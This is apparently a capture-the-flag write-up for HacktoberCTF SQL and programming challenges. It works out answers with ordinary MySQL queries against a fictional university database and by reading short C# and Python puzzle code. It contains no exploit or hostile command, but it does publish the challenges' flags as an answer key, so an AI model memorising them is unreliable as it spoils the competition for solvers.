One of our other analysts isn't familiar with SQL and needs help finding out how many users live in which states. Submit the SQL command used to get the total number of users in the users table who live in California and Minnesota.

NOTE: Send a screenshot of your command and result to syyntax over Slack.

Use the file from Address Book.

```
mysql> select * from states;
+----------+--------------------------------+--------------+------------+
| state_id | state_full                     | state_abbrev | country_id |
+----------+--------------------------------+--------------+------------+
|        1 | Alabama                        | AL           |        199 |
...
|        6 | California                     | CA           |        199 |
...
|       28 | Minnesota                      | MN           |        199 |
...
|       59 | Wyoming                        | WY           |        199 |
+----------+--------------------------------+--------------+------------+
59 rows in set (0.00 sec)

mysql> select count(*) from users where state_id=6 OR state_id=28;
+----------+
| count(*) |
+----------+
|       40 |
+----------+
1 row in set (0.00 sec)

```

```flag: flag{select count(*) from users where state_id=6 OR state_id=28;}```



## Fall Classes
100
syyntax sql SQL

Without counting duplicates, how many courses are being offered in the FALL2020 term at Shallow Grave University? Submit the flag in the following format: flag{#}

Use the file from Address Book.

```
mysql> show tables;
+------------------+
| Tables_in_shall  |
+------------------+
| countries        |
| courses          |
| degree_types     |
| enrollments      |
| passwords        |
| payment_statuses |
| programs         |
| roles            |
| roles_assigned   |
| states           |
| term_courses     |
| terms            |
| users            |
+------------------+
13 rows in set (0.00 sec)

mysql> select * from terms;
+---------+------------+------------+------------+----------------------+
| term_id | term_name  | start_date | end_date   | description          |
+---------+------------+------------+------------+----------------------+
|       1 | SPRING2020 | 2020-04-06 | 2020-07-20 | Spring semester 2020 |
|       2 | FALL2020   | 2020-08-03 | 2020-11-20 | Fall semester 2020   |
+---------+------------+------------+------------+----------------------+


mysql> describe term_courses;
+-------------+------+------+-----+---------+----------------+
| Field       | Type | Null | Key | Default | Extra          |
+-------------+------+------+-----+---------+----------------+
| term_crs_id | int  | NO   | PRI | NULL    | auto_increment |
| course_id   | int  | NO   | MUL | NULL    |                |
| term_id     | int  | NO   | MUL | NULL    |                |
| instructor  | int  | NO   | MUL | NULL    |                |
+-------------+------+------+-----+---------+----------------+
4 rows in set (0.00 sec)


mysql> select distinct course_id from term_courses where term_id=2;
+-----------+
| course_id |
+-----------+
|      6233 |
|      6468 |
|    ...    |
|      6566 |
|      6313 |
+-----------+
401 rows in set (0.00 sec)
```

Use DISTINCT to retrieve unique values:

```flag: flag{401}```



## 90s Kids
150
SQL syyntax

According to conversations found in Ghost Town, r34p3r despises 90s kids and tends to target them in his attacks. How many users in the Shallow Grave SQL dump were born in October in the 1990s?

Submit the flag as flag{#}.

Use the file from Address Book.

```
mysql> select count(*) from users where month(dob) = 10 and year(dob) < 2000 and year(dob) >= 1990;
+----------+
| count(*) |
+----------+
|       32 |
+----------+
1 row in set (0.00 sec)
```
```flag: flag{32}```



## Jigsaw
325
syyntax SQL

We've slowly been piecing together the name of one of DEADFACE's future victims. Here's the information we have:

    The first two characters of the user's last name begin with K, R, or I.
    Followed by any character except newline, then three letters
    Immediately followed by the last letter E-N

Submit the username as the flag.

Use the file from Address Book.

I just got all the last names and applied the following regex:

_ [KRI]{2}.[A-Z]{3}[E-N]_

And found KRYSIAK:

```
mysql> select username from users where last='KRYSIAK';
+----------------+
| username       |
+----------------+
| image.wa1k3624 |
+----------------+
1 row in set (0.00 sec)
```

```flag: flag{image.wa1k3624}```


## Student Body
375
syyntax SQL

We believe Lucia is trying to target a student taught by her SOCI424 professor. How many students were taught by that professor in either term? Submit the number of students as well as the professor's first and last name concatenated.

Example: flag{666_JohnSmith}

Use the file from Address Book.

```
# Lucia's id:

mysql> select user_id from users where first='LUCIA';
+---------+
| user_id |
+---------+
|      49 |
+---------+
1 row in set (0.00 sec)


# Course id:

mysql> select * from courses where title='SOCI424';
+-----------+---------+-------+----------------------------------------+------------------+-----------+
| course_id | title   | level | description                            | long_description | sem_hours |
+-----------+---------+-------+----------------------------------------+------------------+-----------+
|      6775 | SOCI424 | 0     | SOCI424 - Sociology of Death and Dying |                  |         3 |
+-----------+---------+-------+----------------------------------------+------------------+-----------+
1 row in set (0.00 sec)


# Find out the instructors in the different terms:

mysql> select * from term_courses where course_id=6775;
+-------------+-----------+---------+------------+
| term_crs_id | course_id | term_id | instructor |
+-------------+-----------+---------+------------+
|          50 |      6775 |       2 |        415 |
|         107 |      6775 |       1 |         67 |
|         640 |      6775 |       1 |        480 |
+-------------+-----------+---------+------------+
3 rows in set (0.01 sec)


# Now we know term_crs_ids for that course, let's check which term was Lucia enrolled in:

mysql> select * from enrollments where user_id=49 and term_crs_id in (select term_crs_id from term_courses where course_id=6775);
+---------------+---------+-------------+-------------------+
| enrollment_id | user_id | term_crs_id | payment_status_id |
+---------------+---------+-------------+-------------------+
|         28778 |      49 |         640 |                 2 |
+---------------+---------+-------------+-------------------+
1 row in set (0.01 sec)


# Ok it's term_crs_id 640 and the professor was id 480. Professor's name:

mysql> select first,last from users where user_id=480;
+--------+-----------+
| first  | last      |
+--------+-----------+
| CLAUDE | DARRACOTT |
+--------+-----------+
1 row in set (0.00 sec)


# Students taugh by CLAUDE:

mysql> select count(*) from enrollments where term_crs_id in (select term_crs_id from term_courses where instructor=480);
+----------+
| count(*) |
+----------+
|      122 |
+----------+
1 row in set (0.00 sec)
```

```flag: flag{122_CLAUDEDARRACOTT}```





---

# Programming

## Message in an Array
10
nmott131

Deadface has left a message in the code. Can you read the code and figure out what it says? You may also copy and paste the code in an emulator. Enter the answer as flag{Word Word Word Word}.

{% highlight java %}
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GhostTown
{
    class Program
    {
        static void Main(string[] args)
        {
           string[] str = new string[4] {"DEADFACE","Nothing", "Stop", "Will"};

           Console.WriteLine("{1} {3} {2} {0}", str);
        }
    }
{% endhighlight %}

```flag: flag{Nothing Will Stop DEADFACE}```


## Trick or Treat
50
syyntax

We found a script being used by DEADFACE. It should be relatively straightforward, but no one here knows Python very well. Can you help us find the flag in this Python file?

Download file

{% highlight python%}

from hashlib import md5 as m5

def show_flag():
    b = 'gginmevesogithoooedtatefadwecvhgghu' \
        'idiueewrtsadgxcnvvcxzgkjasywpojjsgq' \
        'uegtnxmzbajdu'
    c = f"{b[10:12]}{b[6:8]}{b[4:6]}{b[8:10]}" \
        f"{b[4:6]}{b[12:14]}{b[2:4]}{b[0:2]}" \
        f"{b[14:16]}{b[18:20]}{b[16:18]}{b[20:22]}"
    m = m5()
    m.update(c.encode('utf-8'))
    d = m.hexdigest()
    return f"flag{{{d}}}"


def show_msg():
    print(f'Smell my feet.')


show_msg()
#Add this line
print(show_flag())

{% endhighlight %}

```
kali@kali:~/Desktop/CTFs/HacktoberCTF/Programming$ python3 trickortreat.py 
Smell my feet.
flag{2f3ba6b5fb8bb84c33b584f981c2d13d}
```

```flag: flag{2f3ba6b5fb8bb84c33b584f981c2d13d}```


Thanks for reading!